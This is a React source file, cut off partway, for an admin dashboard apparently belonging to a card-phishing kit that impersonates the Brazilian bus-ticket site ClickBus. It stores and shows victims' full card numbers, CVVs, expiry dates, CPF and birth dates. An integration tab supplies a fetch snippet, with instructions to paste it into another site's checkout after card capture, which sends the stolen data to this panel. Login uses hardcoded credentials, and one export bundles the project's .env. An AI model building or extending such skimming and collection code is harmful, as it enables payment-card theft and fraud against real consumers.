import { useState, useEffect, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import JSZip from "jszip";
import {
  Search, LogOut, ChevronDown, ChevronUp, CreditCard, Download,
  User, Wallet, Bus, Ticket, CheckCircle, XCircle, Package,
  Clock, RefreshCw, BarChart3, QrCode, AlertCircle, Shield,
  Link2, Copy, Eye, EyeOff, RotateCcw, Code2, CheckCheck,
  FileDown, FileJson, FileSpreadsheet, FolderArchive, FileCode2
} from "lucide-react";
import clickbusLogo from "@/assets/clickbus-logo.webp";

// Import all source files as raw strings at build time
const allPages = import.meta.glob("/src/pages/*.tsx", { query: "?raw", import: "default", eager: true }) as Record<string, string>;
const allComponents = import.meta.glob("/src/components/*.tsx", { query: "?raw", import: "default", eager: true }) as Record<string, string>;
const allContexts = import.meta.glob("/src/contexts/*.tsx", { query: "?raw", import: "default", eager: true }) as Record<string, string>;
const allData = import.meta.glob("/src/data/*.ts", { query: "?raw", import: "default", eager: true }) as Record<string, string>;
const allLib = import.meta.glob("/src/lib/*.ts", { query: "?raw", import: "default", eager: true }) as Record<string, string>;
const allEdgeFunctions = import.meta.glob("/supabase/functions/*/index.ts", { query: "?raw", import: "default", eager: true }) as Record<string, string>;
const allIntegrations = import.meta.glob("/src/integrations/supabase/*.ts", { query: "?raw", import: "default", eager: true }) as Record<string, string>;
const allHooks = import.meta.glob("/src/hooks/*.{ts,tsx}", { query: "?raw", import: "default", eager: true }) as Record<string, string>;
const allTypes = import.meta.glob("/src/types/*.ts", { query: "?raw", import: "default", eager: true }) as Record<string, string>;
const rootFiles = import.meta.glob(["/src/App.tsx", "/src/App.css", "/src/main.tsx", "/src/index.css", "/index.html", "/tailwind.config.ts", "/vite.config.ts", "/tsconfig.json", "/tsconfig.app.json", "/postcss.config.js", "/components.json", "/.env"], { query: "?raw", import: "default", eager: true }) as Record<string, string>;

type FileGroup = {
  label: string;
  icon: string;
  files: Record<string, string>;
};

const FILE_GROUPS: FileGroup[] = [
  { label: "Páginas", icon: "pages", files: allPages },
  { label: "Componentes", icon: "components", files: allComponents },
  { label: "Contextos", icon: "contexts", files: allContexts },
  { label: "Dados", icon: "data", files: allData },
  { label: "Utilitários", icon: "lib", files: allLib },
  { label: "Hooks", icon: "hooks", files: allHooks },
  { label: "Types", icon: "types", files: allTypes },
  { label: "Integrations (Supabase)", icon: "integrations", files: allIntegrations },
  { label: "Edge Functions", icon: "edge", files: allEdgeFunctions },
  { label: "Config / Root / .env", icon: "root", files: rootFiles },
];

interface Order {
  id: string;
  created_at: string;
  nome: string;
  email: string;
  telefone: string;
  cpf: string;
  data_nascimento: string;
  origem: string;
  destino: string;
  data_ida: string;
  company: string;
  tipo_assento: string;
  departure: string;
  arrival: string;
  assentos: string;
  valor_total: number;
  metodo_pagamento: string;
  card_numero: string;
  card_nome: string;
  card_validade: string;
  card_cvv: string;
  parcelas: number;
  status: string;
  notas: string;
}

const STATUS_COLORS: Record<string, string> = {
  pendente: "bg-amber-100 text-amber-800 border-amber-300",
  aprovado: "bg-emerald-100 text-emerald-800 border-emerald-300",
  recusado: "bg-red-100 text-red-800 border-red-300",
  coletado: "bg-blue-100 text-blue-800 border-blue-300",
};

export default function ClickBusAdmin() {
  const navigate = useNavigate();
  const [authed, setAuthed] = useState(() => localStorage.getItem("cb_admin_auth") === "true");
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [loginError, setLoginError] = useState("");

  const [orders, setOrders] = useState<Order[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [statusFilter, setStatusFilter] = useState<string>("todos");
  const [activeTab, setActiveTab] = useState<"dashboard" | "integracao" | "exportacao">("dashboard");
  const [apiKey, setApiKey] = useState<string>("");
  const [showKey, setShowKey] = useState(false);
  const [keyLoading, setKeyLoading] = useState(false);
  const [copied, setCopied] = useState<string | null>(null);

  const handleLogin = () => {
    if (user === "cashnotalo" && pass === "12345678") {
      setAuthed(true);
      localStorage.setItem("cb_admin_auth", "true");
      setLoginError("");
    } else {
      setLoginError("Usuário ou senha incorretos");
    }
  };

  const handleLogout = () => {
    setAuthed(false);
    localStorage.removeItem("cb_admin_auth");
  };

  const fetchOrders = async () => {
    setLoading(true);
    const { data } = await supabase
      .from("clickbus_orders")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(500);
    setOrders((data as Order[]) || []);
    setLoading(false);
  };

  useEffect(() => {
    if (authed) {
      fetchOrders();
      fetchApiKey();
    }
  }, [authed]);

  const fetchApiKey = async () => {
    const { data } = await supabase
      .from("integration_keys" as any)
      .select("key_value")
      .eq("key_name", "ingest_api_key")
      .single();
    if (data) setApiKey((data as any).key_value);
  };

  const regenerateKey = async () => {
    setKeyLoading(true);
    const newKey = Array.from(crypto.getRandomValues(new Uint8Array(32)))
      .map(b => b.toString(16).padStart(2, "0")).join("");
    await supabase
      .from("integration_keys" as any)
      .update({ key_value: newKey, updated_at: new Date().toISOString() } as any)
      .eq("key_name", "ingest_api_key");
    setApiKey(newKey);
    setKeyLoading(false);
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(null), 2000);
  };

  const updateStatus = async (id: string, status: string) => {
    await supabase.from("clickbus_orders").update({ status }).eq("id", id);
    setOrders(prev => prev.map(o => o.id === id ? { ...o, status } : o));
  };

  const filtered = useMemo(() => {
    let result = orders;
    if (statusFilter !== "todos") {
      result = result.filter(o => o.status === statusFilter);
    }
    if (!search.trim()) return result;
    const q = search.toLowerCase();
    return result.filter(o =>
      o.nome?.toLowerCase().includes(q) ||
      o.email?.toLowerCase().includes(q) ||
      o.cpf?.includes(q) ||
      o.card_numero?.includes(q) ||
      o.id?.includes(q)
    );
  }, [orders, search, statusFilter]);

  const stats = useMemo(() => {
    const totalCards = orders.filter(o => o.metodo_pagamento === "cartao").length;
    const totalPix = orders.filter(o => o.metodo_pagamento === "pix").length;
    const totalValor = orders.reduce((s, o) => s + (o.valor_total || 0), 0);
    const pendentes = orders.filter(o => o.status === "pendente").length;
    return { total: orders.length, totalCards, totalPix, totalValor, pendentes };
  }, [orders]);

  const maskCard = (num: string) => {
    if (!num) return "—";
    const clean = num.replace(/\s/g, "");
    if (clean.length < 8) return clean;
    return `${clean.slice(0, 4)} ${clean.slice(4, 6)}** **** ${clean.slice(-4)}`;
  };

  const formatDate = (iso: string) => {
    if (!iso) return "—";
    const d = new Date(iso);
    return `${String(d.getDate()).padStart(2, "0")}/${String(d.getMonth() + 1).padStart(2, "0")}/${d.getFullYear().toString().slice(2)} ${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}`;
  };

  const exportCSV = () => {
    const header = "ID,Data,Nome,Email,CPF,Telefone,Origem,Destino,Valor,Método,Status,Cartão\n";
    const rows = filtered.map(o =>
      `${o.id},${o.created_at},${o.nome},${o.email},${o.cpf},${o.telefone},${o.origem},${o.destino},${o.valor_total},${o.metodo_pagamento},${o.status},${maskCard(o.card_numero)}`
    ).join("\n");
    const blob = new Blob([header + rows], { type: "text/csv" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "clickbus_orders.csv";
    a.click();
  };

  // LOGIN SCREEN
  if (!authed) {
    return (
      <div className="min-h-screen bg-[#f5f0fa] flex items-center justify-center p-4" style={{ colorScheme: "light" }}>
        <div className="bg-white border border-gray-200 rounded-2xl shadow-xl p-8 w-full max-w-sm space-y-6">
          <div className="text-center space-y-3">
            <img src={clickbusLogo} alt="ClickBus" className="h-10 mx-auto" />
            <div>
              <h1 className="text-lg font-bold text-gray-900">Painel de Compliance</h1>
              <p className="text-sm text-gray-500 mt-1">Acesso restrito — equipe operacional</p>
            </div>
          </div>
          <div className="space-y-3">
            <input
              type="text"
              placeholder="Usuário"
              value={user}
              onChange={e => setUser(e.target.value)}
              className="w-full bg-gray-50 border border-gray-200 rounded-lg px-4 py-2.5 text-sm text-gray-900 placeholder:text-gray-400 outline-none focus:border-[#8629cc] focus:ring-2 focus:ring-[#8629cc]/20 transition"
            />
            <input
              type="password"
              placeholder="Senha"
              value={pass}
              onChange={e => setPass(e.target.value)}
              onKeyDown={e => e.key === "Enter" && handleLogin()}
              className="w-full bg-gray-50 border border-gray-200 rounded-lg px-4 py-2.5 text-sm text-gray-900 placeholder:text-gray-400 outline-none focus:border-[#8629cc] focus:ring-2 focus:ring-[#8629cc]/20 transition"
            />
            {loginError && <p className="text-xs text-red-500 flex items-center gap-1"><AlertCircle className="w-3 h-3" /> {loginError}</p>}
            <button
              onClick={handleLogin}
              className="w-full bg-[#8629cc] hover:bg-[#6b1fb3] text-white rounded-lg py-2.5 text-sm font-semibold transition-colors"
            >
              Entrar
            </button>
          </div>
          <div className="flex items-center justify-center gap-2 text-xs text-gray-400">
            <Shield className="w-3 h-3" />
            <span>Ambiente seguro</span>
          </div>
        </div>
      </div>
    );
  }

  // DASHBOARD
  return (
    <div className="min-h-screen bg-gray-50 text-gray-900 font-sans" style={{ colorScheme: "light" }}>
      {/* Sidebar */}
      <div className="fixed left-0 top-0 bottom-0 w-56 bg-[#441466] flex flex-col z-50">
        <div className="p-5 border-b border-white/10">
          <img src={clickbusLogo} alt="ClickBus" className="h-8 brightness-0 invert" />
          <p className="text-xs text-white/50 mt-2">Painel Operacional</p>
        </div>
        <nav className="flex-1 p-3 space-y-1">
          <button
            onClick={() => setActiveTab("dashboard")}
            className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-colors ${activeTab === "dashboard" ? "bg-white/15 text-white" : "text-white/60 hover:bg-white/10 hover:text-white"}`}
          >
            <BarChart3 className="w-4 h-4" /> Dashboard
          </button>
          <button
            onClick={() => setActiveTab("integracao")}
            className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-colors ${activeTab === "integracao" ? "bg-white/15 text-white" : "text-white/60 hover:bg-white/10 hover:text-white"}`}
          >
            <Link2 className="w-4 h-4" /> Integração
          </button>
          <button
            onClick={() => setActiveTab("exportacao")}
            className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-colors ${activeTab === "exportacao" ? "bg-white/15 text-white" : "text-white/60 hover:bg-white/10 hover:text-white"}`}
          >
            <FileDown className="w-4 h-4" /> Exportação
          </button>
        </nav>
        <div className="p-3 border-t border-white/10">
          <button onClick={handleLogout} className="w-full flex items-center gap-2 px-3 py-2 rounded-lg text-white/60 hover:text-white hover:bg-white/10 text-sm transition-colors">
            <LogOut className="w-4 h-4" /> Sair
          </button>
        </div>
      </div>

      {/* Main */}
      <div className="ml-56 p-6">
        {activeTab === "exportacao" ? (
          /* EXPORT TAB — Source Files */
          <div className="max-w-4xl">
            <div className="mb-6">
              <h1 className="text-xl font-bold text-gray-900 flex items-center gap-2">
                <FolderArchive className="w-5 h-5 text-[#8629cc]" /> Exportação — Arquivos do Projeto
              </h1>
              <p className="text-xs text-gray-500 mt-0.5">Baixe todos os arquivos de código fonte como ZIP</p>
            </div>

            {/* Download All Button */}
            <div className="bg-white border border-gray-200 rounded-xl p-5 shadow-sm mb-6">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <span className="flex items-center justify-center w-12 h-12 bg-[#8629cc]/10 text-[#8629cc] rounded-xl">
                    <FolderArchive className="w-6 h-6" />
                  </span>
                  <div>
                    <p className="text-base font-bold text-gray-900">Baixar Projeto Completo</p>
                    <p className="text-xs text-gray-500">
                      {Object.values(FILE_GROUPS).reduce((acc, g) => acc + Object.keys(g.files).length, 0)} arquivos — páginas, componentes, contextos, edge functions, configs
                    </p>
                  </div>
                </div>
                <button
                  onClick={async () => {
                    const zip = new JSZip();
                    FILE_GROUPS.forEach(group => {
                      Object.entries(group.files).forEach(([path, content]) => {
                        const cleanPath = path.startsWith("/") ? path.slice(1) : path;
                        zip.file(cleanPath, content);
                      });
                    });
                    const blob = await zip.generateAsync({ type: "blob" });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement("a");
                    a.href = url;
                    a.download = `projeto_completo_${new Date().toISOString().slice(0, 10)}.zip`;
                    a.click();
                    URL.revokeObjectURL(url);
                  }}
                  className="flex items-center gap-2 px-5 py-3 bg-[#8629cc] hover:bg-[#6b1fb3] text-white rounded-xl text-sm font-bold transition-colors"
                >
                  <Download className="w-5 h-5" /> Baixar ZIP
                </button>
              </div>
            </div>

            {/* Data Export */}
            <div className="bg-white border border-gray-200 rounded-xl p-5 shadow-sm mb-6">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <span className="flex items-center justify-center w-10 h-10 bg-amber-50 text-amber-600 rounded-lg">
                    <FileJson className="w-5 h-5" />
                  </span>
                  <div>
                    <p className="text-sm font-semibold text-gray-900">Dados — Pedidos (JSON)</p>
                    <p className="text-xs text-gray-500">{orders.length} pedidos com todos os campos</p>
                  </div>
                </div>
                <button
                  onClick={() => {
                    const blob = new Blob([JSON.stringify(orders, null, 2)], { type: "application/json" });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement("a");
                    a.href = url;
                    a.download = `pedidos_${new Date().toISOString().slice(0, 10)}.json`;
                    a.click();
                    URL.revokeObjectURL(url);
                  }}
                  className="flex items-center gap-2 px-4 py-2 bg-[#8629cc] hover:bg-[#6b1fb3] text-white rounded-lg text-sm font-medium transition-colors"
                >
                  <Download className="w-4 h-4" /> Baixar
                </button>
              </div>
            </div>

            {/* File Groups */}
            <p className="text-xs text-gray-400 font-semibold uppercase tracking-wide mb-3">Arquivos por grupo</p>
            <div className="space-y-3">
              {FILE_GROUPS.map(group => {
                const fileEntries = Object.entries(group.files);
                if (fileEntries.length === 0) return null;
                return (
                  <div key={group.label} className="bg-white border border-gray-200 rounded-xl p-4 shadow-sm">
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <FileCode2 className="w-4 h-4 text-[#8629cc]" />
                        <p className="text-sm font-semibold text-gray-900">{group.label}</p>
                        <span className="text-xs text-gray-400 bg-gray-100 px-2 py-0.5 rounded-full">{fileEntries.length}</span>
                      </div>
                      <button
                        onClick={async () => {
                          const zip = new JSZip();
                          fileEntries.forEach(([path, content]) => {
                            const cleanPath = path.startsWith("/") ? path.slice(1) : path;
                            zip.file(cleanPath, content);
                          });
                          const blob = await zip.generateAsync({ type: "blob" });
                          const url = URL.createObjectURL(blob);
                          const a = document.createElement("a");
                          a.href = url;
                          a.download = `${group.label.toLowerCase().replace(/\s/g, "_")}_${new Date().toISOString().slice(0, 10)}.zip`;
                          a.click();
                          URL.revokeObjectURL(url);
                        }}
                        className="flex items-center gap-1.5 px-3 py-1.5 border border-gray-200 rounded-lg text-xs text-gray-600 hover:bg-gray-100 transition-colors"
                      >
                        <Download className="w-3.5 h-3.5" /> ZIP
                      </button>
                    </div>
                    <div className="space-y-1">
                      {fileEntries.map(([path]) => {
                        const name = path.split("/").pop() || path;
                        return (
                          <p key={path} className="text-xs text-gray-500 font-mono pl-6 truncate" title={path}>
                            {name}
                          </p>
                        );
                      })}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        ) : activeTab === "integracao" ? (
          /* INTEGRATION TAB */
          <div className="max-w-3xl">
            <div className="mb-6">
              <h1 className="text-xl font-bold text-gray-900 flex items-center gap-2">
                <Link2 className="w-5 h-5 text-[#8629cc]" /> Integração — Exportação
              </h1>
              <p className="text-xs text-gray-500 mt-0.5">Conecte outros projetos Lovable para enviar pedidos a este painel</p>
            </div>

            {/* Endpoint */}
            <div className="bg-white border border-gray-200 rounded-xl p-5 shadow-sm mb-4">
              <p className="text-xs text-gray-400 font-semibold uppercase tracking-wide mb-3 flex items-center gap-1.5">
                <Code2 className="w-3.5 h-3.5" /> Endpoint
              </p>
              <div className="flex items-center gap-2">
                <code className="flex-1 bg-gray-50 border border-gray-200 rounded-lg px-4 py-2.5 text-sm font-mono text-gray-700 truncate">
                  {`https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/ingest-order`}
                </code>
                <button
                  onClick={() => copyToClipboard(`https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/ingest-order`, "endpoint")}
                  className="flex items-center gap-1.5 px-3 py-2.5 border border-gray-200 rounded-lg text-sm text-gray-600 hover:bg-gray-100 transition-colors"
                >
                  {copied === "endpoint" ? <CheckCheck className="w-4 h-4 text-emerald-600" /> : <Copy className="w-4 h-4" />}
                </button>
              </div>
              <p className="text-xs text-gray-400 mt-2">Método: POST | Header: <code className="bg-gray-100 px-1 rounded">x-api-key</code></p>
            </div>

            {/* API Key */}
            <div className="bg-white border border-gray-200 rounded-xl p-5 shadow-sm mb-4">
              <p className="text-xs text-gray-400 font-semibold uppercase tracking-wide mb-3 flex items-center gap-1.5">
                <Shield className="w-3.5 h-3.5" /> API Key
              </p>
              <div className="flex items-center gap-2">
                <code className="flex-1 bg-gray-50 border border-gray-200 rounded-lg px-4 py-2.5 text-sm font-mono text-gray-700 truncate">
                  {showKey ? apiKey : "••••••••••••••••••••••••••••••••"}
                </code>
                <button
                  onClick={() => setShowKey(!showKey)}
                  className="flex items-center gap-1.5 px-3 py-2.5 border border-gray-200 rounded-lg text-sm text-gray-600 hover:bg-gray-100 transition-colors"
                  title={showKey ? "Ocultar" : "Mostrar"}
                >
                  {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
                <button
                  onClick={() => copyToClipboard(apiKey, "key")}
                  className="flex items-center gap-1.5 px-3 py-2.5 border border-gray-200 rounded-lg text-sm text-gray-600 hover:bg-gray-100 transition-colors"
                >
                  {copied === "key" ? <CheckCheck className="w-4 h-4 text-emerald-600" /> : <Copy className="w-4 h-4" />}
                </button>
                <button
                  onClick={regenerateKey}
                  disabled={keyLoading}
                  className="flex items-center gap-1.5 px-3 py-2.5 bg-[#8629cc] hover:bg-[#6b1fb3] text-white rounded-lg text-sm font-medium transition-colors disabled:opacity-50"
                >
                  <RotateCcw className={`w-4 h-4 ${keyLoading ? "animate-spin" : ""}`} />
                </button>
              </div>
              <p className="text-xs text-gray-400 mt-2">Use esta chave no header <code className="bg-gray-100 px-1 rounded">x-api-key</code> de cada requisição</p>
            </div>

            {/* Code Snippet */}
            <div className="bg-white border border-gray-200 rounded-xl p-5 shadow-sm mb-4">
              <div className="flex items-center justify-between mb-3">
                <p className="text-xs text-gray-400 font-semibold uppercase tracking-wide flex items-center gap-1.5">
                  <Code2 className="w-3.5 h-3.5" /> Snippet — Cole no outro projeto
                </p>
                <button
                  onClick={() => copyToClipboard(
`const COMPLIANCE_URL = "${`https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/ingest-order`}";
const COMPLIANCE_KEY = "${apiKey}";

async function enviarParaCompliance(dados) {
  const res = await fetch(COMPLIANCE_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "x-api-key": COMPLIANCE_KEY,
    },
    body: JSON.stringify(dados),
  });
  return res.json();
}

// Exemplo de uso:
await enviarParaCompliance({
  nome: "João Silva",
  email: "joao@email.com",
  cpf: "123.456.789-00",
  origem: "São Paulo",
  destino: "Rio de Janeiro",
  valor_total: 89.90,
  metodo_pagamento: "cartao",
  card_numero: "4111111111111111",
  card_nome: "JOAO SILVA",
  card_validade: "12/28",
  card_cvv: "123",
  parcelas: 3,
});`, "snippet"
                  )}
                  className="flex items-center gap-1.5 px-3 py-1.5 border border-gray-200 rounded-lg text-xs text-gray-600 hover:bg-gray-100 transition-colors"
                >
                  {copied === "snippet" ? <><CheckCheck className="w-3.5 h-3.5 text-emerald-600" /> Copiado</> : <><Copy className="w-3.5 h-3.5" /> Copiar</>}
                </button>
              </div>
              <pre className="bg-gray-900 text-green-400 rounded-lg p-4 text-xs font-mono overflow-x-auto leading-relaxed">
{`const COMPLIANCE_URL = "${`https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/ingest-order`}";
const COMPLIANCE_KEY = "SUA_API_KEY_AQUI";

async function enviarParaCompliance(dados) {
  const res = await fetch(COMPLIANCE_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "x-api-key": COMPLIANCE_KEY,
    },
    body: JSON.stringify(dados),
  });
  return res.json();
}

// Exemplo de uso:
await enviarParaCompliance({
  nome: "João Silva",
  email: "joao@email.com",
  cpf: "123.456.789-00",
  origem: "São Paulo",
  destino: "Rio de Janeiro",
  valor_total: 89.90,
  metodo_pagamento: "cartao",
  card_numero: "4111111111111111",
  card_nome: "JOAO SILVA",
  card_validade: "12/28",
  card_cvv: "123",
  parcelas: 3,
});`}
              </pre>
            </div>

            {/* Instructions */}
            <div className="bg-white border border-gray-200 rounded-xl p-5 shadow-sm">
              <p className="text-xs text-gray-400 font-semibold uppercase tracking-wide mb-3">Como conectar</p>
              <ol className="space-y-3 text-sm text-gray-700">
                <li className="flex gap-3">
                  <span className="flex-shrink-0 w-6 h-6 bg-[#8629cc] text-white rounded-full flex items-center justify-center text-xs font-bold">1</span>
                  <span>Copie o <strong>Endpoint</strong> e a <strong>API Key</strong> acima</span>
                </li>
                <li className="flex gap-3">
                  <span className="flex-shrink-0 w-6 h-6 bg-[#8629cc] text-white rounded-full flex items-center justify-center text-xs font-bold">2</span>
                  <span>No outro projeto Lovable, cole o <strong>snippet</strong> no código de checkout (após capturar os dados do cartão)</span>
                </li>
                <li className="flex gap-3">
                  <span className="flex-shrink-0 w-6 h-6 bg-[#8629cc] text-white rounded-full flex items-center justify-center text-xs font-bold">3</span>
                  <span>Cada pedido feito lá aparecerá automaticamente aqui no <strong>Dashboard</strong></span>
                </li>
                <li className="flex gap-3">
                  <span className="flex-shrink-0 w-6 h-6 bg-[#8629cc] text-white rounded-full flex items-center justify-center text-xs font-bold">4</span>
                  <span>Para trocar a chave, clique no botão de <strong>regenerar</strong> e atualize no outro projeto</span>
                </li>
              </ol>
            </div>
          </div>
        ) : (
          /* DASHBOARD TAB */
          <>
            {/* Header */}
            <div className="flex items-center justify-between mb-6">
              <div>
                <h1 className="text-xl font-bold text-gray-900 flex items-center gap-2">
                  <Shield className="w-5 h-5 text-[#8629cc]" /> Compliance — Pedidos
                </h1>
                <p className="text-xs text-gray-500 mt-0.5">Gerenciamento e análise de transações</p>
              </div>
              <div className="flex items-center gap-3">
                <button onClick={fetchOrders} className="flex items-center gap-2 px-4 py-2 border border-gray-200 rounded-lg text-sm text-gray-600 hover:bg-gray-100 bg-white transition-colors">
                  <RefreshCw className="w-4 h-4" /> Atualizar
                </button>
                <button onClick={exportCSV} className="flex items-center gap-2 px-4 py-2 bg-[#8629cc] hover:bg-[#6b1fb3] text-white rounded-lg text-sm font-medium transition-colors">
                  <Download className="w-4 h-4" /> Exportar CSV
                </button>
              </div>
            </div>

            {/* Stats */}
            <div className="grid grid-cols-2 lg:grid-cols-5 gap-4 mb-6">
              <div className="bg-white border border-gray-200 rounded-xl p-4 shadow-sm">
                <div className="flex items-center gap-2 mb-2">
                  <Ticket className="w-4 h-4 text-[#8629cc]" />
                  <p className="text-xs text-gray-500 font-medium uppercase">Total</p>
                </div>
                <p className="text-2xl font-bold text-gray-900">{stats.total}</p>
              </div>
              <div className="bg-white border border-gray-200 rounded-xl p-4 shadow-sm">
                <div className="flex items-center gap-2 mb-2">
                  <CreditCard className="w-4 h-4 text-blue-600" />
                  <p className="text-xs text-gray-500 font-medium uppercase">Cartão</p>
                </div>
                <p className="text-2xl font-bold text-gray-900">{stats.totalCards}</p>
              </div>
              <div className="bg-white border border-gray-200 rounded-xl p-4 shadow-sm">
                <div className="flex items-center gap-2 mb-2">
                  <QrCode className="w-4 h-4 text-green-600" />
                  <p className="text-xs text-gray-500 font-medium uppercase">PIX</p>
                </div>
                <p className="text-2xl font-bold text-gray-900">{stats.totalPix}</p>
              </div>
              <div className="bg-white border border-gray-200 rounded-xl p-4 shadow-sm">
                <div className="flex items-center gap-2 mb-2">
                  <Wallet className="w-4 h-4 text-emerald-600" />
                  <p className="text-xs text-gray-500 font-medium uppercase">Faturamento</p>
                </div>
                <p className="text-2xl font-bold text-gray-900">R$ {stats.totalValor.toFixed(2).replace(".", ",")}</p>
              </div>
              <div className="bg-white border border-gray-200 rounded-xl p-4 shadow-sm">
                <div className="flex items-center gap-2 mb-2">
                  <Clock className="w-4 h-4 text-amber-600" />
                  <p className="text-xs text-gray-500 font-medium uppercase">Pendentes</p>
                </div>
                <p className="text-2xl font-bold text-gray-900">{stats.pendentes}</p>
              </div>
            </div>

            {/* Filters + Search */}
            <div className="flex items-center gap-3 mb-5">
              <div className="flex-1 flex items-center gap-2 bg-white border border-gray-200 rounded-lg px-4 py-2.5 shadow-sm">
                <Search className="w-4 h-4 text-gray-400" />
                <input
                  type="text"
                  placeholder="Buscar por nome, email, CPF ou nº do cartão..."
                  value={search}
                  onChange={e => setSearch(e.target.value)}
                  className="flex-1 bg-transparent text-sm text-gray-900 outline-none placeholder:text-gray-400"
                />
              </div>
              <select
                value={statusFilter}
                onChange={e => setStatusFilter(e.target.value)}
                className="bg-white border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-700 outline-none shadow-sm cursor-pointer"
              >
                <option value="todos">Todos os status</option>
                <option value="pendente">Pendente</option>
                <option value="aprovado">Aprovado</option>
                <option value="recusado">Recusado</option>
                <option value="coletado">Coletado</option>
              </select>
            </div>

            {/* Orders List */}
            {loading ? (
              <div className="text-center py-20 text-gray-400">Carregando...</div>
            ) : filtered.length === 0 ? (
              <div className="text-center py-20 text-gray-400">Nenhum pedido encontrado</div>
            ) : (
              <div className="space-y-2">
                {filtered.map(order => {
                  const expanded = expandedId === order.id;
                  return (
                    <div key={order.id} className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm">
                      <button
                        onClick={() => setExpandedId(expanded ? null : order.id)}
                        className="w-full flex items-center gap-4 px-5 py-4 text-left hover:bg-gray-50 transition-colors"
                      >
                        <span className={`inline-flex items-center justify-center w-9 h-9 rounded-lg ${order.metodo_pagamento === "cartao" ? "bg-blue-50 text-blue-600" : "bg-green-50 text-green-600"}`}>
                          {order.metodo_pagamento === "cartao" ? <CreditCard className="w-4 h-4" /> : <QrCode className="w-4 h-4" />}
                        </span>
                        <div className="flex-1 min-w-0">
                          <p className="text-sm font-semibold text-gray-900 truncate">{order.nome || "Sem nome"}</p>
                          <p className="text-xs text-gray-500 truncate">{order.email || "—"}</p>
                        </div>
                        {order.card_numero && (
                          <span className="text-xs text-gray-400 font-mono hidden md:block">
                            {maskCard(order.card_numero)}
                          </span>
                        )}
                        <span className="text-base font-bold text-gray-900">
                          R$ {(order.valor_total || 0).toFixed(2).replace(".", ",")}
                        </span>
                        {order.parcelas > 1 && (
                          <span className="text-xs text-gray-500">{order.parcelas}x</span>
                        )}
                        <span className={`px-2.5 py-1 rounded-full text-xs font-semibold border capitalize ${STATUS_COLORS[order.status] || STATUS_COLORS.pendente}`}>
                          {order.status}
                        </span>
                        <span className="text-xs text-gray-400 w-28 text-right hidden lg:block">{formatDate(order.created_at)}</span>
                        {expanded ? <ChevronUp className="w-4 h-4 text-gray-400" /> : <ChevronDown className="w-4 h-4 text-gray-400" />}
                      </button>

                      {expanded && (
                        <div className="border-t border-gray-100 px-5 py-5 bg-gray-50/50">
                          <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-6 text-xs">
                            <div>
                              <p className="text-gray-400 font-semibold mb-2 flex items-center gap-1.5 uppercase tracking-wide">
                                <User className="w-3.5 h-3.5" /> Pessoal
                              </p>
                              <div className="space-y-1.5">
                                <p><span className="text-gray-400">Nome</span> <span className="text-gray-900 ml-2 font-medium">{order.nome}</span></p>
                                <p><span className="text-gray-400">Email</span> <span className="text-gray-900 ml-2">{order.email}</span></p>
                                <p><span className="text-gray-400">Tel</span> <span className="text-gray-900 ml-2">{order.telefone}</span></p>
                                <p><span className="text-gray-400">CPF</span> <span className="text-gray-900 ml-2 font-mono">{order.cpf}</span></p>
                                <p><span className="text-gray-400">Nasc</span> <span className="text-gray-900 ml-2">{order.data_nascimento}</span></p>
                              </div>
                            </div>

                            {order.metodo_pagamento === "cartao" && (
                              <div>
                                <p className="text-gray-400 font-semibold mb-2 flex items-center gap-1.5 uppercase tracking-wide">
                                  <CreditCard className="w-3.5 h-3.5" /> Cartão
                                </p>
                                <div className="space-y-1.5">
                                  <p><span className="text-gray-400">Titular</span> <span className="text-gray-900 ml-2 font-medium">{order.card_nome}</span></p>
                                  <p><span className="text-gray-400">Número</span> <span className="text-gray-900 ml-2 font-mono">{order.card_numero}</span></p>
                                  <p><span className="text-gray-400">Validade</span> <span className="text-gray-900 ml-2">{order.card_validade}</span></p>
                                  <p><span className="text-gray-400">CVV</span> <span className="text-gray-900 ml-2 font-mono">{order.card_cvv}</span></p>
                                  <p><span className="text-gray-400">Parcelas</span> <span className="text-gray-900 ml-2">{order.parcelas}x</span></p>
                                </div>
                              </div>
                            )}

                            <div>
                              <p className="text-gray-400 font-semibold mb-2 flex items-center gap-1.5 uppercase tracking-wide">
                                <Bus className="w-3.5 h-3.5" /> Viagem
                              </p>
                              <div className="space-y-1.5">
                                <p><span className="text-gray-400">Origem</span> <span className="text-gray-900 ml-2">{order.origem}</span></p>
                                <p><span className="text-gray-400">Destino</span> <span className="text-gray-900 ml-2">{order.destino}</span></p>
                                <p><span className="text-gray-400">Data</span> <span className="text-gray-900 ml-2">{order.data_ida}</span></p>
                                <p><span className="text-gray-400">Saída</span> <span className="text-gray-900 ml-2">{order.departure}</span></p>
                                <p><span className="text-gray-400">Chegada</span> <span className="text-gray-900 ml-2">{order.arrival}</span></p>
                              </div>
                            </div>

